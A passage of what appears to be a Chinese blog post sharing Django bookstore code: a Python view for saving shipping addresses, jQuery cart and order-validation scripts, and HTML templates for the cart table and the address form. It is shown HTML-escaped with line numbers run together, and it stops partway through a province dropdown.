JsonResponse(&#123;&quot;msg&quot;: &quot;地址已经存在&quot;, &quot;error&quot;: 1&#125;) else: TAddress.objects.create(address=address, name=ship_man, post_code=post, cellphone=cellphone, addr_mobile=addr_mobile, user_id=id.id) return JsonResponse(&#123;&quot;msg&quot;: &quot;订单生成&quot;, &quot;error&quot;: 0&#125;) car.Javascript123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;script type=&quot;text/javascript&quot;&gt; $(function () &#123; &#123;#修改数量以及价格#&#125; $(&quot;.num_del&quot;).click(function () &#123; var num1 = $(this).next().val(); var num2 = Number(num1) - 1; if (num2 == 0)&#123; alert(&quot;商品个数不能再减了!&quot;) &#125;else &#123; $(this).next().val(num2); var price2 = $(this).parent().parent().prev().text(); var count = Number(price2) * num2; $(this).parent().parent().next().text(count.toFixed(2)) //修改小计 $.ajax(&#123; type:&quot;get&quot;, url:&quot;&#123;% url &#x27;car:add_car&#x27; %&#125;&quot;, data: &quot;bookid=&quot;+$(this).next().attr(&#x27;id1&#x27;)+&quot;&amp;booknum=&quot;+(-1), success: function (msg) &#123; $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); &#125; &#125;) &#125; &#125;); $(&quot;.num_add&quot;).click(function () &#123; var num1 = $(this).prev().val(); var num2 = Number(num1) + 1; $(this).prev().val(num2); var price2 = $(this).parent().parent().prev().text(); var count = Number(price2) * num2; $(this).parent().parent().next().text(count.toFixed(2)); $.ajax(&#123; type:&quot;get&quot;, url:&quot;&#123;% url &#x27;car:add_car&#x27; %&#125;&quot;, data: &quot;bookid=&quot;+$(this).prev().attr(&#x27;id1&#x27;)+&quot;&amp;booknum=&quot;+1, success: function (msg) &#123; $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); &#125; &#125;) &#125;); &#123;#删除产品#&#125; $(&quot;.delete&quot;).click(function () &#123; var td = $(this).parent().parent().parent(); $.ajax(&#123; type: &quot;get&quot;, url: &quot;&#123;% url &#x27;car:rem_book&#x27; %&#125;&quot;, data: &quot;id=&quot;+$(this).attr(&#x27;value&#x27;), success: function (msg) &#123; console.log(msg); if (msg.error == 0)&#123; alert(msg.msg); td.remove(); $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); &#125;else&#123; td.remove(); $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); alert(&quot;删除失败!&quot;) &#125; &#125; &#125;) &#125;); &#123;# 输入框失焦 #&#125; $(&quot;.book_num&quot;).blur(function () &#123; var booknum= $(this).val(); var price = $(this).parent().parent().prev().text(); var totalprice = $(this).parent().parent().next().text(); console.log(totalprice); totalprice = Number(booknum)* Number(price); $(this).parent().parent().next().text(totalprice.toFixed(2)); if (booknum == parseInt(booknum) &amp;&amp; booknum &gt; 0)&#123; $.ajax(&#123; type: &quot;get&quot;, url: &quot;&#123;% url &#x27;car:add_car&#x27; %&#125;&quot;, data: &quot;booknum1=&quot;+$(this).val() + &quot;&amp;bookid=&quot;+$(this).attr(&#x27;id1&#x27;), success: function (msg)&#123; console.log(msg); $(&quot;#payAmount&quot;).html(msg.sum_price.toFixed(2)); $(&quot;#count&quot;).html(msg.sum_price.toFixed(2)); &#125; &#125;) &#125;else &#123; alert(&quot;输入数据不合法&quot;) &#125; &#125;); &#123;# 登陆跳转 #&#125; $(&quot;.login_link&quot;).click(function () &#123; var url = location.href; console.log(url); location.href= &quot;&#123;% url &#x27;user:login&#x27; %&#125;?url=&quot;+url; &#125;); &#123;# 注册跳转 #&#125; $(&quot;#regist&quot;).click(function () &#123; var url = location.href; console.log(url); location.href = &quot;&#123;% url &#x27;user:regist&#x27; %&#125;?url=&quot;+url; &#125;); &#123;# 退出 #&#125; $(&quot;#exit&quot;).click(function () &#123; var url = location.href; $.ajax(&#123; type: &#x27;get&#x27;, url: &quot;&#123;% url &#x27;user:exit&#x27; %&#125;&quot;, data: &quot;username=&quot;+$(this).attr(&#x27;name&#x27;), success: function (msg) &#123; console.log(msg); if (msg.error==0)&#123; alert(msg.msg); location.href = &quot;&#123;% url &#x27;car:car&#x27; %&#125;&quot; $(&quot;.login_link&quot;)[0].innerHTML =&#x27; &lt;a class=&quot;login_link&quot; href=&quot;#&quot; &gt;登录&lt;/a&gt;&#x27; &#125;else &#123; alert(&quot;发生错误&quot;) &#125; &#125; &#125;) &#125;); &#125;); &lt;/script&gt; car.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt; &#123;% if user_name %&#125; &#123;% for foo in car %&#125; &lt;tbody data-stock=&quot;22388&quot; data-offline=&quot;false&quot; data-productid=&quot;24147882&quot; data-timestamp=&quot;1484488454000&quot; data-orderforspupormo=&quot;0&quot;&gt; &lt;tr id=&quot;tr_424893864&quot; class=&quot; &quot;&gt; &lt;td class=&quot;row1&quot;&gt; &lt;a href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-product-check checknow check_on&quot;&gt;选中&lt;/a&gt; &lt;/td&gt; &lt;td class=&quot;row_img&quot;&gt; &lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; foo.book.id &#125;&#125;&quot; target=&quot;_blank&quot; dd_name=&quot;查看详情&quot;&gt; &lt;img onmouseout=&quot;$(this).parent().next().hide()&quot; onmouseover=&quot;$(this).parent().next().show()&quot; src=&quot;/static/book_pic/&#123;&#123; foo.book.picture &#125;&#125;&quot; width=&quot;80&quot; height=&quot;80&quot;&gt; &lt;/a&gt; &lt;div style=&quot;display: none;&quot; class=&quot;img_big&quot;&gt;&lt;a href=&quot;/static/book_pic/&#123;&#123; foo.book.picture &#125;&#125;&quot; dd_name=&quot;查看详情&quot; target=&quot;_blank&quot;&gt; &lt;img src=&quot;/static/book_pic/&#123;&#123; foo.book.picture &#125;&#125;&quot;&gt;&lt;/a&gt;&lt;span class=&quot;arrow&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;/td&gt; &lt;td class=&quot;row_name&quot;&gt; &lt;div class=&quot;name&quot;&gt; &lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; foo.book.id &#125;&#125;&quot; title=&quot;&#123;&#123; foo.book.name &#125;&#125;&quot; target=&quot;_blank&quot; dd_name=&quot;查看详情&quot; style=&quot;word-break:break-all; word-wrap:break-word;&quot;&gt;&#123;&#123; foo.book.book_name &#125;&#125;&lt;/a&gt;&lt;/div&gt; &lt;/td&gt; &lt;td class=&quot;row3&quot;&gt;&lt;span id=&quot;price1&quot;&gt;&#123;&#123; foo.book.new_price &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;td data-minbuy=&quot;0&quot; class=&quot;fn-count-tip row3 &quot;&gt; &lt;span class=&quot;amount fn-updatecount &quot; data-value=&quot;1&quot;&gt; &lt;a class=&quot;num_del&quot; dd_name=&quot;减少数量&quot; href=&quot;javascript:void(0)&quot; &gt;-&lt;/a&gt; &lt;input id1=&quot;&#123;&#123; foo.book.id &#125;&#125;&quot; class=&quot;book_num&quot; data-value=&quot;&#123;&#123; foo.count &#125;&#125;&quot; value=&quot;&#123;&#123; foo.count &#125;&#125;&quot; type=&quot;text&quot;&gt; &lt;a class=&quot;num_add&quot; dd_name=&quot;增加数量&quot; href=&quot;javascript:void(0)&quot; &gt;+&lt;/a&gt;&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;row4&quot;&gt;&lt;span class=&quot;red&quot; class=&quot;price2&quot;&gt;&#123;&#123; foo.totalprice &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;row5 &quot;&gt; &lt;span&gt; &lt;a href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-add-wish&quot; dd_name=&quot;加入收藏按钮&quot;&gt;移入收藏&lt;/a&gt; &lt;/span&gt; &lt;span&gt; &lt;a value =&quot;&#123;&#123; foo.book.id &#125;&#125;&quot; class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-remove-product&quot; dd_name=&quot;删除普通品&quot;&gt;删除&lt;/a&gt;&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt; &#123;% endfor %&#125; &#123;% else %&#125; &#123;% for foo in car %&#125; &lt;tbody data-stock=&quot;22388&quot; data-offline=&quot;false&quot; data-productid=&quot;24147882&quot; data-timestamp=&quot;1484488454000&quot; data-orderforspupormo=&quot;0&quot;&gt; &lt;tr id=&quot;tr_424893864&quot; class=&quot; &quot;&gt; &lt;td class=&quot;row1&quot;&gt; &lt;a href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-product-check checknow check_on&quot;&gt;选中&lt;/a&gt; &lt;/td&gt; &lt;td class=&quot;row_img&quot;&gt; &lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; foo.id &#125;&#125;&quot; target=&quot;_blank&quot; dd_name=&quot;查看详情&quot;&gt; &lt;img onmouseout=&quot;$(this).parent().next().hide()&quot; onmouseover=&quot;$(this).parent().next().show()&quot; src=&quot;/static/book_pic/&#123;&#123; foo.picture &#125;&#125;&quot; width=&quot;80&quot; height=&quot;80&quot;&gt; &lt;/a&gt; &lt;div style=&quot;display: none;&quot; class=&quot;img_big&quot;&gt;&lt;a href=&quot;/static/book_pic/&#123;&#123; foo.picture &#125;&#125;&quot; dd_name=&quot;查看详情&quot; target=&quot;_blank&quot;&gt; &lt;img src=&quot;/static/book_pic/&#123;&#123; foo.picture &#125;&#125;&quot;&gt;&lt;/a&gt;&lt;span class=&quot;arrow&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;/td&gt; &lt;td class=&quot;row_name&quot;&gt; &lt;div class=&quot;name&quot;&gt; &lt;a href=&quot;&#123;% url &#x27;book:bookdetails&#x27; %&#125;?id=&#123;&#123; foo.id &#125;&#125;&quot; title=&quot;&#123;&#123; foo.name &#125;&#125;&quot; target=&quot;_blank&quot; dd_name=&quot;查看详情&quot; style=&quot;word-break:break-all; word-wrap:break-word;&quot;&gt;&#123;&#123; foo.book_name &#125;&#125;&lt;/a&gt;&lt;/div&gt; &lt;/td&gt; &lt;td class=&quot;row3&quot;&gt;&lt;span id=&quot;price1&quot;&gt;&#123;&#123; foo.new_price &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;td data-minbuy=&quot;0&quot; class=&quot;fn-count-tip row3 &quot;&gt; &lt;span class=&quot;amount fn-updatecount &quot; data-value=&quot;1&quot;&gt; &lt;a class=&quot;num_del&quot; dd_name=&quot;减少数量&quot; href=&quot;javascript:void(0)&quot; &gt;-&lt;/a&gt; &lt;input id1=&quot;&#123;&#123; foo.id &#125;&#125;&quot; class=&quot;book_num&quot; data-value=&quot;&#123;&#123; foo.count &#125;&#125;&quot; value=&quot;&#123;&#123; foo.count &#125;&#125;&quot; type=&quot;text&quot;&gt; &lt;a class=&quot;num_add&quot; dd_name=&quot;增加数量&quot; href=&quot;javascript:void(0)&quot; &gt;+&lt;/a&gt;&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;row4&quot;&gt;&lt;span class=&quot;red&quot; class=&quot;price2&quot;&gt;&#123;&#123; foo.totalprice &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;row5 &quot;&gt; &lt;span&gt; &lt;a href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-add-wish&quot; dd_name=&quot;加入收藏按钮&quot;&gt;移入收藏&lt;/a&gt; &lt;/span&gt; &lt;span&gt; &lt;a value =&quot;&#123;&#123; foo.id &#125;&#125;&quot; class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; data-item=&quot;424893864&quot; class=&quot;fn-remove-product&quot; dd_name=&quot;删除普通品&quot;&gt;删除&lt;/a&gt;&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt; &#123;% endfor %&#125; &#123;% endif %&#125; &lt;tfoot&gt; &lt;tr class=&quot;total&quot;&gt; &lt;td class=&quot;row1&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td class=&quot;row_img&quot;&gt;店铺合计&lt;/td&gt; &lt;td colspan=&quot;2&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td colspan=&quot;3&quot; class=&quot;row4&quot;&gt; &lt;span id=&quot;count&quot;class=&quot;red big ooline alignright&quot;&gt;¥&#123;&#123; sum_price &#125;&#125;&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/tfoot&gt;&lt;/table&gt; indent.Javascript123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156&lt;script type=&quot;text/javascript&quot;&gt; $(function () &#123; var ship_man = $(&quot;#ship_man&quot;).val(); var addr_mobile = $(&quot;#phone&quot;).val(); var cellphone = $(&quot;#cellphone&quot;).val(); var post = $(&quot;#post&quot;).val(); var address = $(&quot;#address&quot;).val(); &#123;# 退出 #&#125; $(&quot;#exit&quot;).click(function () &#123; $.ajax(&#123; type: &#x27;get&#x27;, url: &quot;&#123;% url &#x27;user:exit&#x27; %&#125;&quot;, data: &quot;username=&quot;+$(this).attr(&#x27;name&#x27;), success: function (msg) &#123; console.log(msg); if (msg.error==0)&#123; alert(msg.msg); location.href = &quot;&#123;% url &#x27;index:index&#x27; %&#125;&quot; &#125;else &#123; alert(msg.msg) &#125; &#125; &#125;) &#125;); &#123;# 收货人校验 #&#125; $(&quot;#ship_man&quot;).blur(function () &#123; f4() &#125;); function f4() &#123; var ship_man = $(&quot;#ship_man&quot;).val(); console.log(ship_man); if (ship_man == &#x27;&#x27;)&#123; $(&quot;#spn_ship_man&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;) return false &#125;else &#123; $(&quot;#spn_ship_man&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;) return true &#125; &#125; &#123;# 详细地址校验 #&#125; $(&quot;#address&quot;).blur(function () &#123; f3() &#125;); function f3() &#123; var address = $(&quot;#address&quot;).val(); var patrn = /.*省(.+)市.*/; if (patrn.test(address))&#123; console.log(&quot;地址格式正确!&quot;); $(&quot;#spn_ship_address&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); return true &#125; else &#123; $(&quot;#spn_ship_address&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); return false &#125; &#125; &#123;# 邮箱校验 #&#125; $(&quot;#post&quot;).blur(function () &#123; f2() &#125;); function f2() &#123; var patrn = /^[a-zA-Z0-9 ]&#123;3,12&#125;$/; var post = $(&quot;#post&quot;).val(); if (patrn.test(post)) &#123; console.log(&quot;邮政编码正确&quot;); $(&quot;#spn_ship_post&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;) return true &#125;else &#123; $(&quot;#spn_ship_address&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); return false &#125; &#125; &#123;# 手机校验 #&#125; $(&quot;#cellphone&quot;).blur(function () &#123; f1() &#125;); function f1() &#123; var patrn = /^1[34578]\\d&#123;9&#125;$/; var cellphone = $(&quot;#cellphone&quot;).val(); var phone = $(&quot;#phone&quot;).val(); if (patrn.test(cellphone))&#123; console.log(&quot;手机号输入正确!&quot;); $(&quot;#spn_ship_phone&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); return true &#125; else &#123; console.log(&quot;手机号输入错误!&quot;); $(&quot;#spn_ship_phone&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); return false &#125; &#125; &#123;# 固定电话校验 #&#125; $(&quot;#addr_mobile&quot;).blur(function () &#123; f(); &#125;); function f() &#123; var patrn = /^(\\+\\d&#123;1,3&#125;)(\\s&#123;1&#125;[1-9]\\d&#123;1,2&#125;\\s&#123;1&#125;)(\\d&#123;7,8&#125;)$/; var addr_mobile = $(&quot;#addr_mobile&quot;).val(); if (patrn.test(addr_mobile))&#123; console.log(&quot;固定电话格式正确&quot;); $(&quot;#spn_ship_phone&quot;).css(&#x27;display&#x27;,&#x27;none&#x27;); return true &#125; else &#123; $(&quot;#spn_ship_phone&quot;).css(&#x27;display&#x27;,&#x27;inline-block&#x27;); return false &#125; &#125; &#123;# 提交订单 #&#125; $(&quot;#order_sumbit&quot;).click(function () &#123; var ship_man = $(&quot;#ship_man&quot;).val(); var addr_mobile = $(&quot;#phone&quot;).val(); var cellphone = $(&quot;#cellphone&quot;).val(); var post = $(&quot;#post&quot;).val(); var address = $(&quot;#address&quot;).val(); console.log(ship_man,addr_mobile) if ((f1() &amp;&amp; f2() &amp;&amp; f3() &amp;&amp; f4()) || (f() &amp;&amp; f2() &amp;&amp; f3() &amp;&amp; f4()))&#123; console.log(1); $.ajax(&#123; type: &quot;post&quot;, url: &quot;&#123;% url &#x27;car:order_submit&#x27; %&#125;&quot;, data: &quot;ship_man=&quot;+ship_man+&quot;&amp;address=&quot;+address+&quot;&amp;addr_mobile=&quot;+addr_mobile+&quot;&amp;cellphone=&quot;+cellphone+&quot;&amp;post=&quot;+post+&quot;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&quot;, success: function (msg) &#123; console.log(msg); if (msg.error == 0)&#123; location.href = &quot;&#123;% url &#x27;car:order_ok&#x27; %&#125;?address=&quot;+address &#125;else if (msg.error ==1) &#123; console.log(&quot;地址已经存在&quot;) location.href = &quot;&#123;% url &#x27;car:order_ok&#x27; %&#125;?address=&quot;+address &#125;else &#123; alert(&quot;产生错误!&quot;) &#125; &#125; &#125;) &#125; else &#123; alert(&quot;存在非法数据&quot;) &#125; &#125;); &#123;# 选择配送地址 #&#125; $(&#x27;#select&#x27;).change(function () &#123; var a = $(&#x27;#select option:selected&#x27;); if (a.val() !== &quot;&quot;) &#123; $(&#x27;input[type=&quot;text&quot;]&#x27;).attr(&#x27;readonly&#x27;,&#x27;readonly&#x27;); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[0]).val(a.attr(&#x27;name&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[1]).val(a.attr(&#x27;address&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[2]).val(a.attr(&#x27;post_code&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[3]).val(a.attr(&#x27;addr_mobile&#x27;)); $($(&#x27;input[type=&quot;text&quot;]&#x27;)[4]).val(a.attr(&#x27;cell_phone&#x27;)); &#125;else &#123; $(&#x27;input[type=&quot;text&quot;]&#x27;).attr(&#x27;readonly&#x27;,&#x27;&#x27;); for (var i=0; i &lt; $(&#x27;input[type=&quot;text&quot;]&#x27;).size();i++) &#123; $($(&#x27;input[type=&quot;text&quot;]&#x27;)[i]).val(&quot;&quot;) &#125; &#125; &#125;) &#125;) &lt;/script&gt; indent.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;div class=&quot;address&quot; id=&quot;dp_adress&quot;&gt; &lt;span class=&quot;icon_adr&quot;&gt;&amp;nbsp;&lt;/span&gt;配送地址： &#123;% if address %&#125; &lt;div class=&quot;select_add&quot;&gt; &lt;select name=&quot;&quot; id=&quot;select&quot; class=&quot;text fn-select-address&quot;&gt; &lt;option value=&quot;&quot; class=&quot;select_add1&quot;&gt;请选择收货地址&lt;/option&gt; &#123;% for address1 in address %&#125; &lt;option class=&quot;select_add1&quot; value=&quot;&#123;&#123; address1.id &#125;&#125;&quot; name=&quot;&#123;&#123; address1.name &#125;&#125;&quot; address=&quot;&#123;&#123; address1.address &#125;&#125;&quot; post_code=&quot;&#123;&#123; address1.post_code &#125;&#125;&quot; cellphone=&quot;&#123;&#123; address1.cellphone &#125;&#125;&quot; addr_mobile=&quot;&#123;&#123; address1.addr_mobile &#125;&#125;&quot; class=&quot;address_select&quot;&gt;&#123;&#123; address1.address &#125;&#125;&lt;/option&gt; &#123;% endfor %&#125; &lt;/select&gt; &#123;% else %&#125; &lt;div class=&quot;select_add&quot;&gt; &lt;select name=&quot;&quot; id=&quot;select_add&quot; class=&quot;text fn-select-address&quot;&gt; &lt;option value=&quot;请选择收货地址&quot;&gt;您还没有添加收货地址&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;/div&gt; &#123;% endif %&#125; &lt;!--&lt;a href=&quot;#&quot; class=&quot;tip&quot;&gt;&lt;/a&gt;--&gt; &lt;span class=&quot;tip_c&quot; style=&quot;display:none;&quot;&gt;针对不同配送地址，您的货物可能出现缺货或无货状态，敬请谅解。&lt;/span&gt;&lt;/div&gt;&lt;ul class=&quot;shdz_con&quot;&gt; &lt;p&gt;▪ 收货地址&lt;/p&gt; &lt;li&gt;&lt;label&gt;&lt;strong&gt;*&lt;/strong&gt;收&amp;nbsp;&amp;nbsp;货&amp;nbsp;&amp;nbsp;人：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;ship_man&quot; id=&quot;ship_man&quot; style=&quot;pointer-events: inherit;&quot;&gt; &lt;span id=&quot;spn_ship_man&quot; class=&quot;hint new_tip&quot; style=&quot;display: none;&quot; &gt;请填写收货人姓名&lt;/span&gt;&lt;/li&gt; &lt;li&gt; &lt;label&gt;&lt;strong&gt;*&lt;/strong&gt;收货地区：&lt;/label&gt; &lt;select id=&quot;country_id&quot; name=&quot;country_id&quot; onfocus=&quot;check_focus(&#x27;spn_country_province_city&#x27;);&quot; onblur=&quot;check_country_province_city();&quot; onchange=&quot;set_province(this.options[this.selectedIndex].value);&quot; style=&quot;display: block;&quot;&gt;&lt;option value=&quot;9000&quot;&gt;中国&lt;/option&gt;&lt;option value=&quot;16767&quot;&gt;阿尔及利亚&lt;/option&gt;&lt;option value=&quot;11717&quot;&gt;阿根廷&lt;/option&gt;&lt;option value=&quot;16161&quot;&gt;阿联酋&lt;/option&gt;&lt;option value=&quot;12020&quot;&gt;埃及&lt;/option&gt;&lt;option value=&quot;12525&quot;&gt;爱尔兰&lt;/option&gt;&lt;option value=&quot;11919&quot;&gt;奥地利&lt;/option&gt;&lt;option value=&quot;10909&quot;&gt;澳大利亚&lt;/option&gt;&lt;option value=&quot;14747&quot;&gt;巴基斯坦&lt;/option&gt;&lt;option value=&quot;12828&quot;&gt;巴拿马&lt;/option&gt;&lt;option value=&quot;10707&quot;&gt;巴西&lt;/option&gt;&lt;option value=&quot;16868&quot;&gt;白俄罗斯&lt;/option&gt;&lt;option value=&quot;16969&quot;&gt;保加利亚&lt;/option&gt;&lt;option value=&quot;13535&quot;&gt;比利时&lt;/option&gt;&lt;option value=&quot;15656&quot;&gt;波多黎各&lt;/option&gt;&lt;option value=&quot;14949&quot;&gt;波兰&lt;/option&gt;&lt;option value=&quot;17272&quot;&gt;玻利维亚&lt;/option&gt;&lt;option value=&quot;14444&quot;&gt;丹麦&lt;/option&gt;&lt;option value=&quot;10505&quot;&gt;德国&lt;/option&gt;&lt;option value=&quot;15353&quot;&gt;俄罗斯&lt;/option&gt;&lt;option value=&quot;10404&quot;&gt;法国&lt;/option&gt;&lt;option value=&quot;12222&quot;&gt;菲律宾&lt;/option&gt;&lt;option value=&quot;12323&quot;&gt;芬兰&lt;/option&gt;&lt;option value=&quot;17474&quot;&gt;古巴&lt;/option&gt;&lt;option value=&quot;12424&quot;&gt;关岛&lt;/option&gt;&lt;option value=&quot;10808&quot;&gt;韩国&lt;/option&gt;&lt;option value=&quot;12121&quot;&gt;荷兰&lt;/option&gt;&lt;option value=&quot;11010&quot;&gt;加拿大&lt;/option&gt;&lt;option value=&quot;15151&quot;&gt;柬埔寨&lt;/option&gt;&lt;option value=&quot;11111&quot;&gt;捷克&lt;/option&gt;&lt;option value=&quot;17373&quot;&gt;喀麦隆&lt;/option&gt;&lt;option value=&quot;14848&quot;&gt;科威特&lt;/option&gt;&lt;option value=&quot;15858&quot;&gt;老挝&lt;/option&gt;&lt;option value=&quot;16262&quot;&gt;黎嫩&lt;/option&gt;&lt;option value=&quot;15959&quot;&gt;列支敦士登&lt;/option&gt;&lt;option value=&quot;16060&quot;&gt;卢森堡&lt;/option&gt;&lt;option value=&quot;17070&quot;&gt;卢旺达&lt;/option&gt;&lt;option value=&quot;13030&quot;&gt;罗马尼亚&lt;/option&gt;&lt;option value=&quot;15555&quot;&gt;马尔代夫&lt;/option&gt;&lt;option value=&quot;13636&quot;&gt;马来西亚&lt;/option&gt;&lt;option value=&quot;10101&quot;&gt;美国&lt;/option&gt;&lt;option value=&quot;14545&quot;&gt;蒙古&lt;/option&gt;&lt;option value=&quot;17171&quot;&gt;孟加拉&lt;/option&gt;&lt;option value=&quot;11818&quot;&gt;秘鲁&lt;/option&gt;&lt;option value=&quot;11212&quot;&gt;墨西哥&lt;/option&gt;&lt;option value=&quot;13232&quot;&gt;南非&lt;/option&gt;&lt;option value=&quot;16666&quot;&gt;南斯拉夫&lt;/option&gt;&lt;option value=&quot;16363&quot;&gt;尼日利亚&lt;/option&gt;&lt;option value=&quot;11313&quot;&gt;挪威&lt;/option&gt;&lt;option value=&quot;12929&quot;&gt;葡萄牙&lt;/option&gt;&lt;option value=&quot;10303&quot;&gt;日本&lt;/option&gt;&lt;option value=&quot;11414&quot;&gt;瑞典&lt;/option&gt;&lt;option value=&quot;13737&quot;&gt;瑞士&lt;/option&gt;&lt;option value=&quot;13838&quot;&gt;塞浦路斯&lt;/option&gt;&lt;option value=&quot;16464&quot;&gt;沙特阿拉伯&lt;/option&gt;&lt;option value=&quot;13333&quot;&gt;斯里兰卡&lt;/option&gt;&lt;option value=&quot;13434&quot;&gt;泰国&lt;/option&gt;&lt;option value=&quot;13939&quot;&gt;坦桑尼亚&lt;/option&gt;&lt;option value=&quot;15757&quot;&gt;土耳其&lt;/option&gt;&lt;option value=&quot;15252&quot;&gt;委内瑞拉&lt;/option&gt;&lt;option value=&quot;15050&quot;&gt;文莱&lt;/option&gt;&lt;option value=&quot;14040&quot;&gt;乌克兰&lt;/option&gt;&lt;option value=&quot;16565&quot;&gt;乌拉圭&lt;/option&gt;&lt;option value=&quot;11515&quot;&gt;西班牙&lt;/option&gt;&lt;option value=&quot;14343&quot;&gt;希腊&lt;/option&gt;&lt;option value=&quot;13131&quot;&gt;新加坡&lt;/option&gt;&lt;option value=&quot;12727&quot;&gt;新西兰&lt;/option&gt;&lt;option value=&quot;14141&quot;&gt;匈牙利&lt;/option&gt;&lt;option value=&quot;12626&quot;&gt;牙买加&lt;/option&gt;&lt;option value=&quot;11616&quot;&gt;意大利&lt;/option&gt;&lt;option value=&quot;10606&quot;&gt;印度&lt;/option&gt;&lt;option value=&quot;14646&quot;&gt;印度尼西亚&lt;/option&gt;&lt;option value=&quot;10202&quot;&gt;英国&lt;/option&gt;&lt;option value=&quot;14242&quot;&gt;越南&lt;/option&gt;&lt;option value=&quot;15454&quot;&gt;智利&lt;/option&gt;&lt;option value=&quot;19999&quot;&gt;其他国家或地区&lt;/option&gt;&lt;/select&gt; &lt;select id=&quot;province_id&quot; name=&quot;province_id&quot; onfocus=&quot;check_focus(&#x27;spn_country_province_city&#x27;);&quot; onblur=&quot;check_country_province_city();&quot; onchange=&quot;set_city(this.options[this.selectedIndex].value);&quot; style=&quot;display: block;&quot;&gt;&lt;option value=&quot;0&quot;&gt;--请选择--&lt;/option&gt;&lt;option value=&quot;111&quot;&gt;北京&lt;/option&gt;&lt;option value=&quot;112&quot;&gt;天津&lt;/option&gt;&lt;option value=&quot;113&quot;&gt;河北&lt;/option&gt;&lt;option value=&quot;114&quot;&gt;山西&lt;/option&gt;&lt;option value=&quot;115&quot;&gt;内蒙古&lt;/option&gt;&lt;option value=&quot;121&quot;&gt;辽宁&lt;/option&gt;&lt;option value=&quot;122&quot;&gt;吉林&lt;/option&gt;&lt;option value=&quot;123&quot;&gt;黑龙江&lt;/option&gt;&lt;option value=&quot;131&quot;&gt;上海&lt;/option&gt;&lt;option value=&quot;132&quot;&gt;江苏&lt;/option&gt;&lt;option value=&quot;133&quot;&gt;浙江&lt;/option&gt;&lt;option value=&quot;134&quot;&gt;安徽&lt;/option&gt;&lt;option value=&quot;135&quot;&gt;福建&lt;/option&gt;&lt;option value=&quot;136&quot;&gt;江西&lt;/option&gt;&lt;option value=&quot;137&quot;&gt;山东&lt;/option&gt;&lt;option value=&quot;141&quot;&gt;河南&lt;/option&gt;&lt;option value=&quot;142&quot;&gt;湖北&lt;/option&gt;&lt;option value=&quot;143&quot;&gt;湖南&lt;/option&gt;&lt;option value=&quot;144&quot;&gt;广东&lt;/option&gt;&lt;option value=&quot;145&quot;&gt;广西&lt;/option&gt;&lt;option value=&quot;146&quot;&gt;海南&lt;/option&gt;&lt;option value=&quot;150&quot;&gt;重庆&lt;/option&gt;&lt;option value=&quot;151&quot;&gt;四川&lt;/option&gt;&lt;option value=&quot;152&quot;&gt;贵州&lt;/option&gt;&lt;option value=&quot;153&quot;&gt;云南&lt;/option&gt;&lt;option value=&quot;154&quot;&gt;西藏&lt;/option&gt;&lt;option value=&quot;161&quot;&gt;陕西&lt;/option&gt;&lt;option value=&quot;162&quot;&gt;甘肃&lt;/option&gt;&lt;option value=&quot;163&quot;&gt;青海&lt;/option&gt;&lt;option value=&quot;164&quot;&gt;宁夏&lt;/option&gt;&lt;option 